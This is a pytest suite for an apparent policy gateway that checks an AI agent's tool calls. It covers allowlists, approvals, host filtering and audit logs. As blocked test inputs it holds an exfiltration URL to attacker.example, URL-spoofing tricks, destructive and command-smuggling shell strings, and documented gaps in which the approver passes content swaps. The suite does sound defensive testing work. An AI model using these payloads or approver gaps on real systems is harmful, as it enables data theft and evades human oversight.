import json

import pytest

from gateway.core import Gateway
from gateway.policy import NetworkPolicy, Policy, load_policy

from gateway.approvers import AllowAll, DenyAll, TaskAware
from gateway.policy import Approvals, is_plain_read

ALL = ["get_time", "list_notes", "read_note", "write_note",
       "run_shell", "http_get", "http_post"]


def make(tmp_path, enforce=True, approver=None, approvals=None):
    ran = []

    def fake(**args):
        ran.append(args)
        return {"ok": True}

    policy = Policy(
        version=1,
        allowed_tools=ALL[:-1],  # http_post is not allowed
        protected_dirs=["config"],
        network=NetworkPolicy(get_allowed_hosts=["example.com"]),
        approvals=approvals or Approvals(),
    )
    gw = Gateway(policy, {n: fake for n in ALL},
                 audit_path=tmp_path / "audit.jsonl", enforce=enforce, approver=approver)
    return gw, ran


ASK_WRITES = Approvals(ask_tools=["write_note"], ask_shell="unless_read_only")


def test_ask_without_approver_fails_closed(tmp_path):
    gw, ran = make(tmp_path, approvals=ASK_WRITES)
    r = gw.handle("write_note", {"filename": "a.txt", "content": "x"})
    assert "Blocked" in r["error"] and ran == []


def test_allow_and_deny_approvers(tmp_path):
    gw, ran = make(tmp_path, approver=AllowAll(), approvals=ASK_WRITES)
    assert gw.handle("write_note", {"filename": "a.txt", "content": "x"}) == {"ok": True}
    gw2, ran2 = make(tmp_path, approver=DenyAll(), approvals=ASK_WRITES)
    assert "Blocked" in gw2.handle("write_note", {"filename": "a.txt", "content": "x"})["error"]
    assert len(ran) == 1 and ran2 == []


def test_plain_reads_do_not_ask(tmp_path):
    gw, _ = make(tmp_path, approver=DenyAll(), approvals=ASK_WRITES)
    assert gw.handle("run_shell", {"command": "ls -la /workspace"}) == {"ok": True}
    assert gw.session["asks"] == 0
    assert "Blocked" in gw.handle("run_shell", {"command": "echo x > a.txt"})["error"]
    assert gw.session["asks"] == 1


def test_is_plain_read():
    for good in ["ls", "ls -la /workspace", "cat /workspace/report.txt", "wc -w report.txt"]:
        assert is_plain_read(good)
    for bad in ["echo x > a", "cat a | tee b", "rm a", "ls; rm a", "sed -i s/a/b/ f",
                "cat $(rm a)", "find . -delete", "sort -o out in", "ls\nrm a"]:
        assert not is_plain_read(bad)


def test_task_aware_approver():
    ap = TaskAware()
    task = "Save a one-line summary to news_summary.txt."
    assert ap.decide("write_note", {"filename": "news_summary.txt", "content": "x"}, task)[0]
    assert not ap.decide("write_note", {"filename": "pwned.txt", "content": "x"}, task)[0]
    assert ap.decide("run_shell", {"command": "cp /workspace/a.txt /workspace/b.txt"},
                     "Copy a.txt to b.txt")[0]
    assert not ap.decide("run_shell", {"command": "rm -rf /workspace/important"}, task)[0]


def test_task_aware_cannot_see_content_swap():
    """Documented limitation: the right file with the wrong content is approved."""
    ap = TaskAware()
    task = "Save a one-line summary to news_summary.txt."
    assert ap.decide("write_note", {"filename": "news_summary.txt", "content": "hacked"}, task)[0]


def test_session_counts_reset(tmp_path):
    gw, _ = make(tmp_path, approver=AllowAll(), approvals=ASK_WRITES)
    gw.handle("write_note", {"filename": "a.txt", "content": "x"})
    assert gw.session["asks"] == 1 and gw.session["approved"] == 1
    gw.start_session("new task")
    assert gw.session["asks"] == 0


def test_policy_v2_loads():
    policy = load_policy("policies/v2_approvals.yaml")
    assert policy.approvals.ask_tools == ["write_note"]
    assert policy.approvals.ask_shell == "unless_read_only"
    assert "http_post" not in policy.allowed_tools


def test_bad_ask_shell_value_rejected(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("version: 2\nallowed_tools: [list_notes]\napprovals:\n  ask_shell: sometimes\n")
    with pytest.raises(ValueError):
        load_policy(p)

def test_task_aware_checks_names_not_intent():
    """Documented limitation: a file the task only MENTIONS can still be overwritten."""
    ap = TaskAware()
    assert ap.decide("write_note", {"filename": "report.txt", "content": "DATA CORRUPTED"},
                     "Summarize report.txt.")[0]


def test_read_with_stderr_redirect_still_asks():
    """Documented strictness: a harmless 2>/dev/null makes a read look like a write."""
    assert not is_plain_read("find / -name missing.txt 2>/dev/null")

def test_allowed_call_runs(tmp_path):
    gw, ran = make(tmp_path)
    assert gw.handle("read_note", {"filename": "a.txt"}) == {"ok": True}
    assert len(ran) == 1


def test_unknown_tool_denied(tmp_path):
    gw, ran = make(tmp_path)
    assert "Blocked" in gw.handle("format_disk", {})["error"]
    assert ran == []


def test_tool_not_in_policy_denied(tmp_path):
    gw, ran = make(tmp_path)
    r = gw.handle("http_post", {"url": "https://example.com/x", "body": "hi"})
    assert "Blocked" in r["error"] and ran == []


def test_bad_arguments_denied(tmp_path):
    gw, ran = make(tmp_path)
    assert "Blocked" in gw.handle("read_note", {})["error"]
    assert "Blocked" in gw.handle("read_note", {"filename": "a", "x": 1})["error"]
    assert "Blocked" in gw.handle("read_note", {"filename": 5})["error"]
    assert ran == []


def test_get_host_allowlist(tmp_path):
    gw, ran = make(tmp_path)
    assert gw.handle("http_get", {"url": "https://example.com/news"}) == {"ok": True}
    assert "Blocked" in gw.handle("http_get", {"url": "https://attacker.example/log?key=abc"})["error"]
    assert "Blocked" in gw.handle("http_get", {"url": "ftp://example.com/x"})["error"]
    assert len(ran) == 1


def test_lookalike_hosts_denied(tmp_path):
    gw, ran = make(tmp_path)
    assert "Blocked" in gw.handle("http_get", {"url": "https://example.com.attacker.example/x"})["error"]
    assert "Blocked" in gw.handle("http_get", {"url": "https://attacker.example/?u=example.com"})["error"]
    assert ran == []


def test_shell_receives_protected_dirs(tmp_path):
    gw, ran = make(tmp_path)
    gw.handle("run_shell", {"command": "ls"})
    assert ran[0]["readonly_dirs"] == ["config"]


def test_log_only_mode_runs_but_records_denial(tmp_path):
    gw, ran = make(tmp_path, enforce=False)
    gw.handle("http_get", {"url": "https://attacker.example/x"})
    assert len(ran) == 1
    entry = json.loads((tmp_path / "audit.jsonl").read_text().splitlines()[-1])
    assert entry["decision"] == "deny" and entry["enforced"] is False


def test_every_call_is_audited(tmp_path):
    gw, _ = make(tmp_path)
    gw.handle("list_notes", {})
    gw.handle("http_get", {"url": "https://attacker.example/x"})
    lines = (tmp_path / "audit.jsonl").read_text().splitlines()
    assert [json.loads(l)["decision"] for l in lines] == ["allow", "deny"]


def test_policy_typo_is_rejected(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("version: 1\nallowed_tools: [list_notes]\nprotectd_dirs: [config]\n")
    with pytest.raises(ValueError):
        load_policy(p)


def test_default_policy_loads():
    policy = load_policy("policies/default.yaml")
    assert "http_post" not in policy.allowed_tools
    assert {"config", "secrets", "important"} <= set(policy.protected_dirs)

def test_url_tricks_denied(tmp_path):
    gw, ran = make(tmp_path)
    for url in ("https://example.com@attacker.example/x",
                "https://attacker.example#@example.com/"):
        assert "Blocked" in gw.handle("http_get", {"url": url})["error"]
    assert ran == []


def test_host_case_is_ignored(tmp_path):
    gw, ran = make(tmp_path)
    assert gw.handle("http_get", {"url": "https://EXAMPLE.com/news"}) == {"ok": True}